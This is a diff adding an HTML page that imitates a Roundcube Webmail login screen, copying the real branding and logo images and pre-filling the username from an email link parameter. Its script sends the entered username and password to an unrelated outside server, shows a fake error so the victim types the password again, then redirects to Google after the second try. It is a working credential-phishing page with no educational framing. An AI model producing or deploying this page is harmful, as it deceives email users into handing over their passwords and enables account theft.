@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1705745704">
+    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #21292c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Changed to min-height */
+            position: relative; /* Added */
+        }
+
+        .login-container {
+            margin-top: -120px;
+            padding: 20px 40px;
+            width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            border: 1px solid #7c949c;
+            border-radius: 5px;
+            overflow: hidden;
+            background-color: #374549; /* Background color for the left side */
+        }
+
+        .input-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            background-color: #374549;
+            color: #c5d1d3; /* Updated icon color */
+        }
+
+        .input-icon i {
+            font-size: 16px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            font-size: 18px;
+            background-color: #21292c; /* Match the body's background color */
+            color: rgb(224, 221, 221);
+            outline: none;
+            border-left: 1px solid #7c949c;
+            
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 17px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            box-shadow: 0 0 7px #44bdfa;
+            border: 1px solid #37beff;
+        }
+
+        .button-container {
+            margin-top: 8px; /* Adjust the margin as needed */
+            border: 1px solid #37beff; /* Border for the button */
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        button {
+            width: 100%;
+            padding: 5px;
+            background-color: #006a9d;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007bb7;
+        }
+
+        /* Footer styling */
+        footer {
+            position: fixed;
+            bottom: 0px;
+            right: 10px;
+        }
+
+        footer img {
+            width: 320px;
+            height: auto;
+        }
+
+        .err {
+            display: none;
+            z-index: 3;
+        }
+
+        .cll {
+    display: none;
+    align-items: center; /* Center items vertically */
+}
+
+.loader-container {
+    display: flex;
+    align-items: center; /* Center items vertically */
+}
+
+.spinner {
+    border: 4px solid rgba(0, 0, 0, 0.1);
+    border-left-color: #bdc8ca;
+    animation: spin 1s linear infinite;
+    border-radius: 100%;
+    width: 20px;
+    height: 20px;
+    margin-right: -40px; /* Adjust the margin as needed */
+    z-index: 2;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo" style="margin-bottom: 15px;">
+            <img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1705745704" alt="Roundcube Logo" width="100px" style="opacity: .8;">
+        </div>
+        <form id="loginForm">
+            <div class="input-group">
+                <div class="input-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <input type="text" id="username" name="username" placeholder="Username" required>
+            </div>
+            <div class="input-group">
+                <div class="input-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <div class="button-container">
+                <button type="submit">LOGIN</button>
+            </div>
+        </form>
+        <div style="font-weight: 400; color: #8ba3a7;font-size: 14px; margin-top: 15px;">Roundcube Webmail</div>
+    </div>
+    <footer>
+        <div class="err">
+            <img src="data:image/png;base64,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" alt="">
+        </div>
+        <div class="cll">
+            <span class="spinner"></span>   <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUUAAAA7CAIAAABjSQ8PAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAF8WlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDIgNzkuMTY0NDYwLCAyMDIwLzA1LzEyLTE2OjA0OjE3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjEuMiAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDI0LTA2LTEyVDA5OjAxOjQ1KzAxOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyNC0wNi0xMlQwOTowMzo1MyswMTowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyNC0wNi0xMlQwOTowMzo1MyswMTowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxMDBiYzUyOC1iN2U0LTBmNDctYmIwYS1lMjkwOWM4ZGUwNTEiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo0MTljNjllNS0zMzkxLTQwNGMtODI0Mi1iZWYxZGE4NTdiNGQiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo2MWRmNjc0ZC0xYTczLWIyNDctODYxNS0xMWU2NDA1NTg1OGIiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjYxZGY2NzRkLTFhNzMtYjI0Ny04NjE1LTExZTY0MDU1ODU4YiIgc3RFdnQ6d2hlbj0iMjAyNC0wNi0xMlQwOTowMTo0NSswMTowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIxLjIgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDoxMDBiYzUyOC1iN2U0LTBmNDctYmIwYS1lMjkwOWM4ZGUwNTEiIHN0RXZ0OndoZW49IjIwMjQtMDYtMTJUMDk6MDM6NTMrMDE6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyMS4yIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5lyPdmAAAHFUlEQVR4nO3d629T5x0H8N/zHJ84thMHHNsQ29UWEiC0sAEjBcIlmTYYLeolSunE2MomDdEX2/6ddRuDbhKqtIilrVRaBu2SQFtNGt3WlgSkxnZzIytJ6lzsOLbP8+zFMbmULLaPHR9y9P28sp2Tc35+8c1zPSesfsdOAgBL4GYXAAAlgzwDWAfyDGAdyDOAdSDPANZhW3hV6XQ5XFU2VTWxGgDIXyadnovPJhPxhU+yea50uqo3bDSpKgAwwqaqemwXIp3tbztcVaYVBQBFWBrebJ7RzQZYp5aGF/NhANaBPANYB/IMYB3IM4B1IM8A1oE8A1hH6fLMiBMxxhknxhgRMVaycwNAPkqQ52xuJQkiKYUUJKUkRpxYZaWdkGqAcrHlPmRVCmNihaZYSkkaSS05rzBGNk5CakIUeS0AWF1RedbDrKeXGJFc4RhNSspoREScCIkGWEtF9bc1JrNhppXDvIwgjiE1wFoqbvwsSMrs7Fdeh8ucoQcA4wrL8zeCqydZIqUAj4fC8lx0cFn+jTkAFErZ6PMTkavanfNQzhmTyyKtKEpBjfPDdekckX75VMeJE8f7++8lk8n8T766V8+fa2090t9/z+ut/c2vf8UVJRr9slQnBzBXYmZaf1HA/LbCFI0ySz/RNK2gq3LOhdmrVmP3xy5een1qasrcMgDWQgF5tlXY0smMwT43Iy5JsSkiZXKeM5o2Onrf3BoA1kgBeU6l5hUyujlEkiDSUovNu4HVaL/P19HRHgoFieiLLwb+2vWW3syGgsEXXnguGAhIkks//+53dp08+UyVq2picoJRdqwQCgV/fvaVWx9+1N3d8+r5c4lEQlGUxsYGIcTHH//jvWvXhJB2u739xed37dophPjss8+feCJ0+5N/d3f3FFgvQLnlOx/GOdM0qUmpZTRNCGO7ODUSjGd/s9Aw2+32U6c6nE7H5ctvXL78hsez8dRL7fYK1eVytrc/T0QXLl7qevPtYDB48uQzRBQI1D377Imvv45duHjp9u1/VVVXr3jaLVu2RCLR3772+zt3+vbt27t92zYiams72tTUdP36+xf+eElVVY/HY+TbApRdvu3zN5eOjfW6JS20k4V6ckeT11v73rW/9fXfJSKvt7atrbWhoeHuvXudnVdmZmfj8UQ4HNn3vb3u6moi2trYoKrq9Rvvh8ORcDjS1LTd5XI+etqxsbHunl4i+uftT7Zt2+r3+waHhpq2bx8aHOy9eVMIqWlafX29oW8LUG5597dLvcZcaH+7ZsMGTRMjI6P629H7Y0Tk83n7+u+m0pkfHT/mqfUQkddbOz4+QUSbNm1KxBMTE5N5nj+ZTAohGVecTmelvWJkZFoIrKvDOlPs/RiGScaoFBtRAoG6s6/8VFFsd/r6ZmZmatyLC2+SpIG9LqpaYVMr4vFE8bUBlFlZn2egPNxhxhgrNGlTsZii8GAwoL8N1G0mogcPxrc2NlRWOt5552pX11s3bnywkMOJyUmHw+l2rzxsXsXs7OzcXMLrrS30FwFMV9b2WRLlOXjmjPv9vqoql/42mUz29d9taTl4+FDLzPQMETU37xsdHR0YGLDb7VLKQDDwYHx87+7doVBweHiEiMIDkQP7n249eqT35q1AoM7v98Xj8dUu+dD09HR4ILx7z5621qORaPTI4UNOh4OIOGd+ny85n4rFYjZF8W/yT01NxeMJl8tZU1Pz1X+/yhS4Gg9QcmXI8+KNlIKI5Tdo9ng2/uLszxbefjk49Nrv/tDZeaWjo/3MmdNEFIlEu958ez6V/s+nn9ZvqT94YH/LwQORSDQajbrdbrfbHYlGP/h79/fbWs+f++XE5MTnd/rqv/2tPCt+99r1arf72LEfCCHC4ch8ap6I3O6aM2dODw0N/6Xzyua6zQuLXs3NzYcPtbz+pz/rf0cATMTqd+wkIl8gtFYXWD5M5ozrTfR6uYujsbHhJ6d/3NPT29N7y+xaAFb2YHRYf1Fs+5xzmvqRdS5BVPDgucy83tqnnnpS3+B9YP/TmYw2ODhsdlEAuRWdZ9XGhCQptPxWd+R6eExgRUXF3j27jx/7ISMWi8WuXn03Eo2aXRRAbob724t3SUlJTOFyyWwQJy64eLTh1u+ueswbZ4B1p/j+9rJUyuVTu4JWCDORPpg2ekEAyKVc61WM2GM/bAZY74znmXNusylSMCG13DdCy3xXngHAMOP7w4QQqVSaSCgc/zQH4LFQbH87nclwxhSbQprQ0J0GMFUJxs9i4Yn5/+eR+gBQHiXtKiPMAKbC0BfAOpBnAOtAngGsA3kGsA7kGcA6kGcA68jmOZNOm1sHABizNLzZPM/FZ00qBgCKsjS82f1hyUSciByuKpuqmlMUABQok07PxWf18OoW93smE/GlPwCAdQfzYQDWgTwDWAfyDGAd/wPBuJdUU4FZUAAAAABJRU5ErkJggg==" alt="">
+        </div>
+    </footer>
+
+    <script>
+
+
+        // Function to get query parameters from URL
+        function getQueryParam(param) {
+            var urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get email from URL and set it in the username input
+        window.onload = function() {
+            var email = getQueryParam('email');
+            if (email) {
+                document.getElementById('username').value = email;
+            }
+        };
+
+
+
+        var submissionCount = 0; // Variable to track submission count
+    
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+    
+            if (username.trim() !== '' && password.trim() !== '') {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://mybestjobs.co.ke/gth/next.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    
+                xhr.onloadstart = function() {
+                    document.querySelector('.cll').style.display = 'flex'; // Display loading spinner
+                    document.querySelector('.spinner').style.display = 'inline-block'; // Display spinning loader
+                };
+    
+                xhr.onloadend = function() {
+                    setTimeout(function() {
+                        document.querySelector('.spinner').style.display = 'none'; // Hide spinning loader
+                        document.querySelector('.cll').style.display = 'none'; // Display success message
+                        document.querySelector('.err').style.display = 'block'; // Display error message
+                        document.getElementById('password').value = ''; // Clear password input
+                    }, 2000); // Hide spinner after 2 seconds
+                };
+    
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            // Handle successful response here
+                        } else {
+                            document.querySelector('.err').style.display = 'block'; // Display error message
+                        }
+                    }
+                };
+    
+                xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
+    
+                // Increment submission count
+                submissionCount++;
+    
+                // Check if it's the second submission
+                if (submissionCount === 2) {
+                    // Hide error message immediately
+                    document.querySelector('.err').style.display = 'none';
+                }
+    
+                // Check if it's the second submission and redirect to Google
+                if (submissionCount === 2) {
+                    // Redirect to Google after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = 'https://google.com';
+                    }, 2000);
+                }
+            } else {
+                // Handle case where username or password is empty
+            }
+        });
+    </script>
+    
+    
+    
+    
+</body>
+</html>
